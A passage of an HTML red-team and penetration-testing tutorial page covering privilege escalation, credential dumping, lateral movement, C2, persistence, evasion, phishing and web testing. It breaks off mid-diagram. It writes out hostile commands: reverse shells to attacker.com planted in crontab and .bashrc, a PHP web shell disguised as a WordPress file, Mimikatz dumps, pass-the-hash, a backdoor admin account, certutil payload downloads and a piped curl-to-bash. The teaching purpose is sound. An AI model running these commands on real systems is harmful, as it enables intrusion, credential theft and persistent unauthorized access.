+<span class="k">curl</span> -L https://linpeas.sh | bash
+
+<span class="c"># Linux — LinEnum (alternative)</span>
+<span class="k">./LinEnum.sh</span> -s -r report.txt
+
+<span class="c"># Linux — find SUID binaries manually</span>
+<span class="k">find</span> / -perm -4000 -type f 2>/dev/null
+
+<span class="c"># Linux — check sudo permissions</span>
+<span class="k">sudo</span> -l
+
+<span class="c"># Windows — WinPEAS</span>
+.\winPEASany.exe
+
+<span class="c"># Windows — check if AlwaysInstallElevated is set</span>
+<span class="k">reg</span> query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</pre>
+
+      <div class="note-box"><strong>📌 GTFOBins:</strong> If you find a SUID binary or a sudo permission for a known Linux binary, check <strong>gtfobins.github.io</strong> — it's a curated list of how to exploit common Unix binaries to escalate privileges. For example, if <code>vim</code> has SUID set, GTFOBins tells you exactly how to get a root shell from it.</div>
+    </div>
+
+
+    <!-- S10: POST-EXPLOITATION -->
+    <div class="lab-section" id="s10">
+      <div class="s-head"><span class="s-num">10</span><h2>Post-Exploitation — Maximizing Impact</h2><span class="s-badge sb-cyan">Advanced</span></div>
+
+      <p>Post-exploitation begins after you've gained elevated access. The goal shifts to: <em>how deep can you go?</em> This phase demonstrates the real business impact of the compromise.</p>
+
+      <h3>Key Post-Exploitation Goals</h3>
+      <div class="flow-steps">
+        <div class="flow-step"><div class="fs-num">1</div><div class="fs-body"><h4>Situational Awareness</h4><p>Who am I? What machine is this? What OS? What users exist? What network am I on? Commands: <code>whoami</code>, <code>hostname</code>, <code>ipconfig</code>/<code>ifconfig</code>, <code>net users</code>, <code>ps aux</code></p></div></div>
+        <div class="flow-step"><div class="fs-num">2</div><div class="fs-body"><h4>Credential Harvesting</h4><p>Dump password hashes, plaintext credentials from memory, browser saved passwords, config files with hardcoded credentials. Tools: <strong>Mimikatz</strong> (Windows), <strong>secretsdump.py</strong> (impacket), <code>cat /etc/shadow</code> (Linux)</p></div></div>
+        <div class="flow-step"><div class="fs-num">3</div><div class="fs-body"><h4>Data Exfiltration Simulation</h4><p>Identify sensitive data (PII, financial records, source code, intellectual property). Demonstrate you could have stolen it — document the location but don't actually exfiltrate real data in most engagements.</p></div></div>
+        <div class="flow-step"><div class="fs-num">4</div><div class="fs-body"><h4>Pivoting / Lateral Movement</h4><p>Use the compromised machine as a stepping stone to reach other internal systems. This proves how one compromised endpoint can lead to full network compromise.</p></div></div>
+        <div class="flow-step"><div class="fs-num">5</div><div class="fs-body"><h4>Covering Tracks (Authorized)</h4><p>Clear event logs, bash history, and temp files. In authorized engagements, document what you modified so it can be restored. Never delete logs on unauthorized systems — that's evidence destruction.</p></div></div>
+      </div>
+
+      <pre><span class="c"># Windows — Dump credentials with Mimikatz</span>
+mimikatz # <span class="k">sekurlsa::logonpasswords</span>  <span class="c"># Dump LSASS memory</span>
+mimikatz # <span class="k">lsadump::sam</span>              <span class="c"># Dump SAM database</span>
+mimikatz # <span class="k">kerberos::list</span>            <span class="c"># List Kerberos tickets</span>
+
+<span class="c"># Meterpreter — dump hashes</span>
+meterpreter &gt; <span class="k">hashdump</span>
+
+<span class="c"># Pass-the-Hash — authenticate without cracking the password</span>
+<span class="k">evil-winrm</span> -i 192.168.1.100 -u Administrator -H "aad3b435b51404eeaad3b435b51404ee:8f81ee5558e2d1205a84d07b0e3cf7f8"</pre>
+    </div>
+
+
+    <!-- S11: LATERAL MOVEMENT -->
+    <div class="lab-section" id="s11">
+      <div class="s-head"><span class="s-num">11</span><h2>Lateral Movement — Spreading Through the Network</h2><span class="s-badge sb-red">Network</span></div>
+
+      <p>Lateral movement is moving from one compromised machine to other machines in the network. Real attackers don't stop at one machine — they pivot until they reach the crown jewels (Domain Controller, database servers, backup systems).</p>
+
+      <h3>Common Lateral Movement Techniques</h3>
+      <table>
+        <thead><tr><th>Technique</th><th>Description</th><th>Tools</th></tr></thead>
+        <tbody>
+          <tr><td>Pass-the-Hash (PtH)</td><td>Use a stolen NTLM hash to authenticate as that user without knowing their password</td><td>Evil-WinRM, CrackMapExec, Impacket</td></tr>
+          <tr><td>Pass-the-Ticket (PtT)</td><td>Steal and reuse a Kerberos ticket for authentication</td><td>Mimikatz, Rubeus</td></tr>
+          <tr><td>Golden Ticket</td><td>Forge a Kerberos ticket with KRBTGT hash — gives permanent domain admin access</td><td>Mimikatz, Impacket</td></tr>
+          <tr><td>Remote Services</td><td>Use credentials to connect via RDP, WinRM, SSH, SMB</td><td>Evil-WinRM, xfreerdp, smbexec</td></tr>
+          <tr><td>WMI Execution</td><td>Run commands on remote Windows machines via Windows Management Instrumentation</td><td>wmiexec.py, CrackMapExec</td></tr>
+        </tbody>
+      </table>
+
+      <h3>BloodHound — Mapping Active Directory Attack Paths</h3>
+      <p>BloodHound is a game-changer for Windows Active Directory engagements. It maps all AD relationships (users, groups, computers, permissions) and automatically finds attack paths to Domain Admin.</p>
+
+      <pre><span class="c"># Collect AD data with SharpHound (runs on Windows target)</span>
+.\SharpHound.exe -c All
+
+<span class="c"># Import collected JSON into BloodHound GUI</span>
+<span class="c"># BloodHound shows graphical attack paths:</span>
+<span class="g">[john.doe] → [Domain Admins] via GenericWrite on [IT-GROUP]</span>
+<span class="c"># Translation: john.doe can modify IT-GROUP, which gives DA access</span>
+
+<span class="c"># CrackMapExec — Swiss army knife for Windows network attacks</span>
+<span class="k">crackmapexec</span> smb 192.168.1.0/24    <span class="c"># Scan SMB on entire subnet</span>
+<span class="k">crackmapexec</span> smb 192.168.1.50 -u admin -p Password123 --shares  <span class="c"># Check shares</span></pre>
+
+      <div class="info-box"><strong>🎯 The Goal of Lateral Movement:</strong> Reach the Domain Controller (DC). If you compromise a DC, you effectively own the entire Windows domain — all user accounts, all computers, all data. In a pentest, reaching DC proves the organization's entire infrastructure could be compromised from a single entry point.</div>
+    </div>
+
+
+    <!-- S12: C2 FRAMEWORKS -->
+    <div class="lab-section" id="s12">
+      <div class="s-head"><span class="s-num">12</span><h2>C2 Frameworks — Command &amp; Control</h2><span class="s-badge sb-purple">Advanced</span></div>
+
+      <p>A <strong>Command and Control (C2) framework</strong> is the infrastructure a red teamer uses to maintain communication with and control over compromised machines. Real APT (Advanced Persistent Threat) actors use C2 to control entire botnets of compromised systems from a single interface.</p>
+
+      <div class="diagram-container">
+        <div class="diagram-title">C2 Architecture — How It Works</div>
+        <svg width="100%" viewBox="0 0 700 170" xmlns="http://www.w3.org/2000/svg">
+          <defs><marker id="c2arr" markerWidth="7" markerHeight="7" refX="5" refY="3.5" orient="auto"><path d="M1 1L6 3.5L1 6" fill="none" stroke="#4a3030" stroke-width="1.5"/></marker></defs>
+          <!-- Operator -->
+          <rect x="10" y="55" width="130" height="60" rx="8" fill="rgba(139,92,246,.07)" stroke="rgba(139,92,246,.2)" stroke-width="1.5"/>
+          <text x="75" y="80" text-anchor="middle" fill="#8b5cf6" font-size="11" font-weight="600">👤 Operator</text>
+          <text x="75" y="97" text-anchor="middle" fill="#7a8fa8" font-size="10">(Red Teamer)</text>
+          <text x="75" y="110" text-anchor="middle" fill="#4a3030" font-size="9">Kali Linux + GUI</text>
+          <!-- Arrow -->
+          <line x1="140" y1="85" x2="195" y2="85" stroke="#4a3030" stroke-width="1.5" marker-end="url(#c2arr)"/>
+          <text x="167" y="78" text-anchor="middle" fill="#4a3030" font-size="8">HTTPS</text>
+          <!-- C2 Server -->
+          <rect x="197" y="40" width="150" height="90" rx="8" fill="rgba(255,60,60,.07)" stroke="rgba(255,60,60,.2)" stroke-width="1.5"/>
+          <text x="272" y="65" text-anchor="middle" fill="#ff3c3c" font-size="11" font-weight="600">🖥️ C2 Server</text>
+          <text x="272" y="82" text-anchor="middle" fill="#7a8fa8" font-size="10">Cobalt Strike / Havoc</text>
+          <text x="272" y="97" text-anchor="middle" fill="#4a3030" font-size="9">Manages all agents</text>
+          <text x="272" y="110" text-anchor="middle" fill="#4a3030" font-size="9">Issues commands</text>
+          <text x="272" y="122" text-anchor="middle" fill="#4a3030" font-size="9">Receives output</text>
+          <!-- Arrow -->
+          <line x1="347" y1="85" x2="400" y2="85" stroke="#4a3030" stroke-width="1.5" marker-end="url(#c2arr)"/>
+          <text x="373" y="78" text-anchor="middle" fill="#4a3030" font-size="8">DNS/HTTP</text>
+          <!-- Agents -->
+          <rect x="402" y="20" width="130" height="50" rx="8" fill="rgba(245,158,11,.07)" stroke="rgba(245,158,11,.2)" stroke-width="1.5"/>
+          <text x="467" y="43" text-anchor="middle" fill="#f59e0b" font-size="10" font-weight="600">💻 Agent/Beacon</text>
+          <text x="467" y="58" text-anchor="middle" fill="#4a3030" font-size="9">Victim Machine 1</text>
+          <rect x="402" y="80" width="130" height="50" rx="8" fill="rgba(245,158,11,.07)" stroke="rgba(245,158,11,.2)" stroke-width="1.5"/>
+          <text x="467" y="103" text-anchor="middle" fill="#f59e0b" font-size="10" font-weight="600">💻 Agent/Beacon</text>
+          <text x="467" y="118" text-anchor="middle" fill="#4a3030" font-size="9">Victim Machine 2</text>
+          <rect x="402" y="140" width="130" height="28" rx="8" fill="rgba(245,158,11,.05)" stroke="rgba(245,158,11,.12)" stroke-width="1"/>
+          <text x="467" y="158" text-anchor="middle" fill="#4a3030" font-size="9">...more victims...</text>
+          <!-- Redirector note -->
+          <text x="570" y="85" text-anchor="middle" fill="#4a3030" font-size="9" font-style="italic">← Redirectors hide</text>
+          <text x="570" y="97" text-anchor="middle" fill="#4a3030" font-size="9" font-style="italic">real C2 server IP</text>
+        </svg>
+      </div>
+
+      <h3>Popular C2 Frameworks</h3>
+      <div class="tool-grid">
+        <div class="tool-card"><div class="tc-name">🎯 Cobalt Strike</div><div class="tc-desc">Industry-leading commercial C2. Used by both red teams and real APT groups. Features: beacons, malleable C2, teamserver. Extremely stealthy with proper configuration.</div><span class="tc-tag">Commercial · ~$5000/yr</span></div>
+        <div class="tool-card"><div class="tc-name">👹 Havoc</div><div class="tc-desc">Modern open-source C2 framework written in Go/C. Comparable to Cobalt Strike in features. Demon agent supports sleep obfuscation, HTTPS, and indirect syscalls.</div><span class="tc-tag">Free · Open Source</span></div>
+        <div class="tool-card"><div class="tc-name">⚔️ Sliver</div><div class="tc-desc">Open-source C2 from BishopFox. Cross-platform agents (Windows/Linux/macOS). Supports mTLS, WireGuard, HTTP, DNS channels. Strong evasion capabilities.</div><span class="tc-tag">Free · Open Source</span></div>
+        <div class="tool-card"><div class="tc-name">🦅 Metasploit</div><div class="tc-desc">The beginner-friendly choice. Meterpreter sessions function as basic C2. Built-in post-exploitation modules, persistence, and pivoting. Best for learning.</div><span class="tc-tag">Free · Open Source</span></div>
+      </div>
+    </div>
+
+
+    <!-- S13: PERSISTENCE -->
+    <div class="lab-section" id="s13">
+      <div class="s-head"><span class="s-num">13</span><h2>Persistence — Surviving Reboots</h2><span class="s-badge sb-red">Technique</span></div>
+
+      <p>Persistence means ensuring your access survives a system reboot or user logoff. Real attackers plant persistence mechanisms so they can return even if their initial entry point is discovered and patched.</p>
+
+      <div class="tab-row">
+        <button class="tab-btn active" onclick="showTab('linux-persist')">🐧 Linux</button>
+        <button class="tab-btn" onclick="showTab('win-persist')">🪟 Windows</button>
+        <button class="tab-btn" onclick="showTab('web-persist')">🌐 Web Shell</button>
+      </div>
+
+      <div class="tab-pane active" id="linux-persist">
+        <h4>Linux Persistence Techniques</h4>
+        <pre><span class="c"># Method 1 — Cron Job (runs every minute)</span>
+<span class="k">echo</span> "* * * * * /bin/bash -i &gt;&amp; /dev/tcp/attacker.com/4444 0&gt;&amp;1" &gt;&gt; /etc/crontab
+
+<span class="c"># Method 2 — SSH authorized_keys (permanent SSH access)</span>
+<span class="k">echo</span> "ssh-rsa AAAA...your_public_key..." &gt;&gt; /home/user/.ssh/authorized_keys
+
+<span class="c"># Method 3 — .bashrc / .profile (runs on every shell login)</span>
+<span class="k">echo</span> "nohup bash -i &gt;&amp; /dev/tcp/attacker.com/4444 0&gt;&amp;1 &amp;" &gt;&gt; /home/user/.bashrc
+
+<span class="c"># Method 4 — Systemd service (survives reboot)</span>
+<span class="k">cat</span> &gt; /etc/systemd/system/updater.service <span class="s">&lt;&lt;EOF
+[Unit]
+Description=System Update Service
+[Service]
+ExecStart=/tmp/reverse_shell.sh
+Restart=always
+[Install]
+WantedBy=multi-user.target
+EOF</span>
+<span class="k">systemctl</span> enable updater.service</pre>
+      </div>
+
+      <div class="tab-pane" id="win-persist">
+        <h4>Windows Persistence Techniques</h4>
+        <pre><span class="c"># Method 1 — Registry Run Key (runs payload on every login)</span>
+<span class="k">reg</span> add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /t REG_SZ /d "C:\Temp\payload.exe"
+
+<span class="c"># Method 2 — Scheduled Task (runs as SYSTEM on boot)</span>
+<span class="k">schtasks</span> /create /sc onlogon /tn "WindowsUpdater" /tr "C:\Temp\payload.exe" /ru SYSTEM
+
+<span class="c"># Method 3 — New local admin account (backdoor user)</span>
+<span class="k">net</span> user hacker Password123! /add
+<span class="k">net</span> localgroup administrators hacker /add
+
+<span class="c"># Method 4 — Golden Ticket (Kerberos — domain-wide persistence)</span>
+<span class="c"># Requires Domain Controller compromise + KRBTGT hash from Mimikatz</span>
+mimikatz # kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-... /krbtgt:HASH /ptt</pre>
+      </div>
+
+      <div class="tab-pane" id="web-persist">
+        <h4>Web Shell — Remote Access via Browser</h4>
+        <pre><span class="c"># Simple PHP web shell (upload to vulnerable web server)</span>
+&lt;?php echo system(<span class="s">$_GET['cmd']</span>); ?&gt;
+
+<span class="c"># Usage: http://target.com/uploads/shell.php?cmd=whoami</span>
+<span class="g"># Returns: www-data</span>
+
+<span class="c"># More feature-rich — p0wny-shell, b374k, China Chopper</span>
+<span class="c"># Disguise it as an innocent file name:</span>
+<span class="k">mv</span> shell.php wp-xmlrpc.php   <span class="c"># Looks like WordPress core file</span></pre>
+      </div>
+
+      <div class="warning-box"><strong>⚠️ Remove All Persistence After Engagement:</strong> Every backdoor, every scheduled task, every added user account MUST be documented and removed before the engagement ends. Leaving persistence mechanisms creates real security risks for the client and is a breach of professional ethics.</div>
+    </div>
+
+
+    <!-- S14: DEFENSE EVASION -->
+    <div class="lab-section" id="s14">
+      <div class="s-head"><span class="s-num">14</span><h2>Defense Evasion — Staying Under the Radar</h2><span class="s-badge sb-purple">Stealth</span></div>
+
+      <p>Advanced red teams don't just break in — they do it <em>without being detected</em>. Defense evasion techniques help bypass antivirus, EDR, IDS, and SIEM detection. Understanding evasion is also essential for blue teamers building better defenses.</p>
+
+      <h3>Common Evasion Techniques</h3>
+      <table>
+        <thead><tr><th>Technique</th><th>How It Works</th><th>Defeats</th></tr></thead>
+        <tbody>
+          <tr><td>Payload Encoding/Obfuscation</td><td>Encode payload in Base64, XOR, or custom encryption to hide from AV signatures</td><td>Antivirus (signature-based)</td></tr>
+          <tr><td>Living Off the Land (LOLBins)</td><td>Use built-in OS tools (PowerShell, certutil, mshta) as attack tools — no malware to detect</td><td>AV, some EDRs</td></tr>
+          <tr><td>Process Injection</td><td>Inject shellcode into a legitimate process (svchost.exe, explorer.exe) — malicious code runs under trusted process</td><td>Process monitoring, AV</td></tr>
+          <tr><td>Timestomping</td><td>Change file creation/modification timestamps to match system files — looks like old, trusted file</td><td>Forensic timeline analysis</td></tr>
+          <tr><td>HTTPS C2 Traffic</td><td>Command and control traffic hidden inside normal HTTPS traffic — looks like regular web browsing</td><td>Network-based IDS</td></tr>
+          <tr><td>DNS Tunneling</td><td>Encode data in DNS queries — firewalls often allow all DNS traffic</td><td>Firewall rules</td></tr>
+          <tr><td>Fileless Malware</td><td>Execute entirely in RAM — never writes to disk, so no file for AV to scan</td><td>File-based AV</td></tr>
+        </tbody>
+      </table>
+
+      <pre><span class="c"># Living Off The Land — use certutil to download a file (no wget needed)</span>
+<span class="k">certutil</span> -urlcache -split -f http://attacker.com/payload.exe C:\Temp\update.exe
+
+<span class="c"># Encode PowerShell command as Base64 to bypass command-line logging</span>
+<span class="c"># The -enc flag runs Base64-encoded commands</span>
+<span class="k">powershell</span> -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAn
+      <div class="note-box"><strong>📌 Blue Team Note:</strong> Understanding evasion is why blue teams need behavioral detection, not just signature detection. An EDR that only compares file hashes misses fileless attacks entirely. Modern SOCs use anomaly-based rules: "why is Excel.exe making outbound network connections?" That's LOLBin abuse.</div>
+    </div>
+
+
+    <!-- S15: SOCIAL ENGINEERING -->
+    <div class="lab-section" id="s15">
+      <div class="s-head"><span class="s-num">15</span><h2>Social Engineering — Hacking Humans</h2><span class="s-badge sb-warn">People</span></div>
+
+      <p>The most secure firewall in the world can't stop an employee clicking a convincing phishing email. Social engineering exploits <em>human psychology</em>, not technical vulnerabilities. Studies consistently show that <strong>over 90% of breaches start with phishing</strong>.</p>
+
+      <div class="info-box"><strong>💡 Kevin Mitnick's Rule:</strong> The famous hacker Kevin Mitnick — once the FBI's most wanted — said: "I never had to hack a single computer. I simply asked people for what I wanted, and they gave it to me." Social engineering is often faster and more reliable than technical exploitation.</div>
+
+      <h3>Social Engineering Attack Types</h3>
+      <div class="flow-steps">
+        <div class="flow-step"><div class="fs-num">📧</div><div class="fs-body"><h4>Phishing</h4><p>Mass emails impersonating trusted organizations (bank, Microsoft, HR). Goal: steal credentials or deliver malware. <strong>Spearphishing</strong> is targeted at specific individuals using personal details gathered from OSINT.</p></div></div>
+        <div class="flow-step"><div class="fs-num">📞</div><div class="fs-body"><h4>Vishing (Voice Phishing)</h4><p>Phone calls impersonating IT support, bank fraud teams, or executives. "Hi, this is Mike from IT — we detected unusual activity on your account. I need to verify your password to reset it."</p></div></div>
+        <div class="flow-step"><div class="fs-num">💬</div><div class="fs-body"><h4>Smishing (SMS Phishing)</h4><p>Malicious SMS messages: "Your parcel delivery failed. Click here to reschedule: [malicious link]" — extremely effective because people trust SMS more than email.</p></div></div>
+        <div class="flow-step"><div class="fs-num">🎭</div><div class="fs-body"><h4>Pretexting</h4><p>Creating a fabricated scenario to gain trust. Impersonating a vendor, auditor, or new employee to extract information or physical access: "I'm the new IT contractor — I need to check the server room."</p></div></div>
+        <div class="flow-step"><div class="fs-num">🎁</div><div class="fs-body"><h4>Baiting</h4><p>Leaving infected USB drives in parking lots, lobbies, or bathrooms. Curious employees plug them in — the drive auto-runs a payload. This technique has an astonishingly high success rate.</p></div></div>
+      </div>
+
+      <h3>Psychology Behind Social Engineering</h3>
+      <p>Social engineers exploit well-documented psychological principles:</p>
+      <table>
+        <thead><tr><th>Principle</th><th>How Attackers Use It</th><th>Example</th></tr></thead>
+        <tbody>
+          <tr><td><strong>Authority</strong></td><td>Impersonate CEO, IT admin, auditor</td><td>"I'm calling from Microsoft Support — your PC is infected"</td></tr>
+          <tr><td><strong>Urgency</strong></td><td>Create time pressure to bypass critical thinking</td><td>"Your account will be locked in 15 minutes — click here NOW"</td></tr>
+          <tr><td><strong>Fear</strong></td><td>Threaten consequences if no action taken</td><td>"IRS: Immediate action required — failure to comply results in arrest"</td></tr>
+          <tr><td><strong>Curiosity</strong></td><td>Entice with interesting content</td><td>"Your performance review results are attached"</td></tr>
+          <tr><td><strong>Trust/Familiarity</strong></td><td>Reference names or details from OSINT</td><td>"Hi Sarah, John from accounting asked me to contact you about Q3 reports"</td></tr>
+          <tr><td><strong>Reciprocity</strong></td><td>Give something first to create obligation</td><td>Free gift/voucher email that requires "login to claim"</td></tr>
+        </tbody>
+      </table>
+    </div>
+
+
+    <!-- S16: PHISHING LAB -->
+    <div class="lab-section" id="s16">
+      <div class="s-head"><span class="s-num">16</span><h2>🧪 Phishing Email Analysis Lab</h2><span class="s-badge sb-warn">Interactive</span></div>
+
+      <p>Red teamers craft phishing emails. Blue teamers analyze and catch them. This lab teaches both skills — analyze these simulated phishing emails and identify what makes them malicious.</p>
+
+      <div id="phishLab" style="margin-top:14px;">
+        <div style="display:flex;gap:8px;margin-bottom:16px;flex-wrap:wrap;" id="phishTabs">
+          <button class="tab-btn active" onclick="showPhish(0)">Email #1</button>
+          <button class="tab-btn" onclick="showPhish(1)">Email #2</button>
+          <button class="tab-btn" onclick="showPhish(2)">Email #3</button>
+        </div>
+        <div id="phishContent"></div>
+      </div>
+    </div>
+
+
+    <!-- S17: WEB APP PENTESTING -->
+    <div class="lab-section" id="s17">
+      <div class="s-head"><span class="s-num">17</span><h2>Web Application Penetration Testing</h2><span class="s-badge sb-cyan">Web</span></div>
+
+      <p>Web applications are the most common target in modern penetration tests. The <strong>OWASP Top 10</strong> is the gold standard list of the most critical web vulnerabilities that every pentester must know.</p>
+
+      <h3>OWASP Top 10 (2021) — Every Pentester's Checklist</h3>
+      <table>
+        <thead><tr><th>Rank</th><th>Vulnerability</th><th>Quick Test</th></tr></thead>
+        <tbody>
+          <tr><td>A01</td><td><strong>Broken Access Control</strong></td><td>Try accessing admin pages as a normal user: /admin, /dashboard</td></tr>
+          <tr><td>A02</td><td><strong>Cryptographic Failures</strong></td><td>Check if sensitive data transmitted over HTTP (not HTTPS)</td></tr>
+          <tr><td>A03</td><td><strong>Injection (SQLi, XSS, etc.)</strong></td><td>Input <code>' OR 1=1--</code> in login fields</td></tr>
+          <tr><td>A04</td><td><strong>Insecure Design</strong></td><td>Check for business logic flaws — can you buy items for negative price?</td></tr>
+          <tr><td>A05</td><td><strong>Security Misconfiguration</strong></td><td>Default credentials, exposed /phpmyadmin, debug mode on</td></tr>
+          <tr><td>A06</td><td><strong>Vulnerable Components</strong></td><td>Check software versions → search CVE databases</td></tr>
+          <tr><td>A07</td><td><strong>Auth Failures</strong></td><td>Test for weak passwords, no account lockout, session fixation</td></tr>
+          <tr><td>A08</td><td><strong>Software & Data Integrity</strong></td><td>Check for unsigned updates, CDN dependencies, CI/CD exposure</td></tr>
+          <tr><td>A09</td><td><strong>Logging Failures</strong></td><td>Generate errors — are they exposed in responses?</td></tr>
+          <tr><td>A10</td><td><strong>SSRF</strong></td><td>Input <code>http://localhost/admin</code> in URL fields</td></tr>
+        </tbody>
+      </table>
+
+      <h3>Burp Suite — The Web Pentester's Best Friend</h3>
+      <p>Burp Suite is the industry-standard web application testing platform. It sits as a proxy between your browser and the target, letting you intercept, modify, and replay every HTTP request.</p>
+
+      <div class="tool-grid">
+        <div class="tool-card"><div class="tc-name">🔄 Proxy</div><div class="tc-desc">Intercept every request between your browser and the target. Modify parameters, headers, cookies — anything — before it reaches the server.</div><span class="tc-tag">Core Feature</span></div>
+        <div class="tool-card"><div class="tc-name">🔁 Repeater</div><div class="tc-desc">Send a captured request over and over with modifications. Essential for manually testing SQL injection, XSS, and parameter tampering.</div><span class="tc-tag">Manual Testing</span></div>
+        <div class="tool-card"><div class="tc-name">💣 Intruder</div><div class="tc-desc">Automated attack tool — brute force passwords, fuzz parameters, enumerate users. Configure positions and payloads for targeted attacks.</div><span class="tc-tag">Automation</span></div>
+        <div class="tool-card"><div class="tc-name">🕷️ Spider/Scanner</div><div class="tc-desc">Automatically crawl the web app to discover all pages, forms, and endpoints. Pro version includes active vulnerability scanner.</div><span class="tc-tag">Discovery</span></div>
+      </div>
+
+      <pre><span class="c"># Burp Suite workflow for SQLi testing:</span>
+<span class="c"># 1. Set browser proxy to 127.0.0.1:8080</span>
+<span class="c"># 2. Intercept login request in Proxy tab</span>
+<span class="c"># 3. Send to Repeater (Ctrl+R)</span>
+<span class="c"># 4. Modify the username field:</span>
+POST /login HTTP/1.1
+username=<span class="k">admin' OR '1'='1'--</span>&password=anything
+
+<span class="c"># If SQLi exists, you bypass authentication</span>
+<span class="g">HTTP/1.1 302 Found — Redirect to /dashboard (success!)</span></pre>
+    </div>
+
+
+    <!-- S18: RED TEAM TOOLS -->
+    <div class="lab-section" id="s18">
+      <div class="s-head"><span class="s-num">18</span><h2>Red Team Tools Arsenal</h2><span class="s-badge sb-lime">Reference</span></div>
+
+      <h4>Reconnaissance Tools</h4>
+      <div class="tool-grid">
+        <div class="tool-card"><div class="tc-name">📡 Nmap</div><div class="tc-desc">Port scanning and service enumeration. The absolute first tool in any pentest. Know it inside-out.</div><span class="tc-tag">Free · Essential</span></div>
+        <div class="tool-card"><div class="tc-name">🔍 theHarvester</div><div class="tc-desc">OSINT tool — collects email addresses, subdomains, and employee names from public sources (Google, LinkedIn, Shodan).</div><span class="tc-tag">Free · OSINT</span></div>
+        <div class="tool-card"><div class="tc-name">🌐 Shodan</div><div class="tc-desc">"The search engine for hackers." Finds internet-connected devices, open ports, and exposed services globally.</div><span class="tc-tag">Free tier · Recon</span></div>
+        <div class="tool-card"><div class="tc-name">🦅 Maltego</div><div class="tc-desc">Visual intelligence and link analysis. Maps relationships between domains, IPs, people, and organizations.</div><span class="tc-tag">Free/Pro · OSINT</span></div>
+      </div>
+
+      <h4>Exploitation Frameworks</h4>
+      <div class="tool-grid">
+        <div class="tool-card"><div class="tc-name">💥 Metasploit</div><div class="tc-desc">The exploitation framework. 2000+ modules covering exploits, payloads, post-exploitation, and auxiliary tools. Start here.</div><span class="tc-tag">Free · Essential</span></div>
+        <div class="tool-card"><div class="tc-name">🔑 Hydra</div><div class="tc-desc">Brute force passwords against 50+ protocols — SSH, FTP, HTTP, RDP, MySQL, and more. Fast and modular.</div><span class="tc-tag">Free · Password</span></div>
+        <div class="tool-card"><div class="tc-name">💉 SQLmap</div><div class="tc-desc">Automated SQL injection detection and exploitation. Can dump databases, read files, and even get OS shells.</div><span class="tc-tag">Free · Web</span></div>
+        <div class="tool-card"><div class="tc-name">🕷️ Burp Suite</div><div class="tc-desc">The definitive web app security testing platform. Community edition free. Pro adds active scanning (~$500/yr).</div><span class="tc-tag">Free/Pro · Web</span></div>
+      </div>
+
+      <h4>Post-Exploitation Tools</h4>
+      <div class="tool-grid">
+        <div class="tool-card"><div class="tc-name">🔓 Mimikatz</div><div class="tc-desc">The credential harvester. Extracts plaintext passwords, hashes, PINs, and Kerberos tickets from Windows memory.</div><span class="tc-tag">Free · Windows</span></div>
+        <div class="tool-card"><div class="tc-name">🩸 BloodHound</div><div class="tc-desc">Maps Active Directory attack paths visually. Instantly shows paths from any user to Domain Admin. Revolutionary.</div><span class="tc-tag">Free · AD</span></div>
+        <div class="tool-card"><div class="tc-name">⬆️ LinPEAS/WinPEAS</div><div class="tc-desc">Automated privilege escalation enumeration for Linux and Windows. Highlights potential vectors in color.</div><span class="tc-tag">Free · PrivEsc</span></div>
+        <div class="tool-card"><div class="tc-name">💀 Evil-WinRM</div><div class="tc-desc">Full-featured WinRM shell for Windows post-exploitation. Supports pass-the-hash, file upload/download, and more.</div><span class="tc-tag">Free · Windows</span></div>
+      </div>
+    </div>
+
+
+    <!-- S19: REPORTING -->
+    <div class="lab-section" id="s19">
+      <div class="s-head"><span class="s-num">19</span><h2>Pentest Reporting — The Real Deliverable</h2><span class="s-badge sb-green">Professional</span></div>
+
+      <p>A pentester who can't write a clear report is unemployable. <strong>The report is what the client paid for.</strong> It's proof of value, a roadmap for remediation, and a legal record of the engagement. A good report can be the difference between a client renewing the contract or not.</p>
+
+      <div class="diagram-container">
+        <div class="diagram-title">Anatomy of a Professional Pentest Report</div>
+        <svg width="100%" viewBox="0 0 700 220" xmlns="http://www.w3.org/2000/svg">
+          <!-- Executive Summary -->
+          <rect x="10" y="10" width="200" height="195" rx="10" fill="rgba(255,60,60,.06)" stroke="rgba(255,60,60,.2)" stroke-width="1.5"/>
+          <text x="110" y="35" text-anchor="middle" fill="#ff3c3c" font-size="11" font-weight="600">Executive Summary</text>
+          <text x="110" y="52" text-anchor="middle" fill="#7a8fa8" font-size="9">For management / C-Suite</text>
+          <text x="110" y="70" text-anchor="middle" fill="#4a3030" font-size="9">• Engagement overview</text>
+          <text x="110" y="86" text-anchor="middle" fill="#4a3030" font-size="9">• Risk level (Critical/High/Med)</text>
+          <text x="110" y="102" text-anchor="middle" fill="#4a3030" font-size="9">• Key findings summary</text>
+          <text x="110" y="118" text-anchor="middle" fill="#4a3030" font-size="9">• Business impact explained</text>
+          <text x="110" y="134" text-anchor="middle" fill="#4a3030" font-size="9">• Recommended actions</text>
+          <text x="110" y="150" text-anchor="middle" fill="#4a3030" font-size="9">Non-technical language!</text>
+          <text x="110" y="190" text-anchor="middle" fill="#7a8fa8" font-size="8" font-style="italic">1-2 pages max</text>
+          <!-- Technical Findings -->
+          <rect x="225" y="10" width="250" height="195" rx="10" fill="rgba(245,158,11,.06)" stroke="rgba(245,158,11,.2)" stroke-width="1.5"/>
+          <text x="350" y="35" text-anchor="middle" fill="#f59e0b" font-size="11" font-weight="600">Technical Findings</text>
+          <text x="350" y="52" text-anchor="middle" fill="#7a8fa8" font-size="9">For IT/Security teams</text>
+          <text x="350" y="70" text-anchor="middle" fill="#4a3030" font-size="9">• Each vulnerability listed</text>
+          <text x="350" y="86" text-anchor="middle" fill="#4a3030" font-size="9">• CVSS severity score</text>
+          <text x="350" y="102" text-anchor="middle" fill="#4a3030" font-size="9">• Step-by-step reproduction</text>
+          <text x="350" y="118" text-anchor="middle" fill="#4a3030" font-size="9">• Evidence (screenshots)</text>
+          <text x="350" y="134" text-anchor="middle" fill="#4a3030" font-size="9">• CVE references</text>
+          <text x="350" y="150" text-anchor="middle" fill="#4a3030" font-size="9">• Remediation steps</text>
+          <text x="350" y="166" text-anchor="middle" fill="#4a3030" font-size="9">• Code fixes where applicable</text>
+          <text x="350" y="190" text-anchor="middle" fill="#7a8fa8" font-size="8" font-style="italic">Bulk of the report</text>
+          <!-- Appendices -->
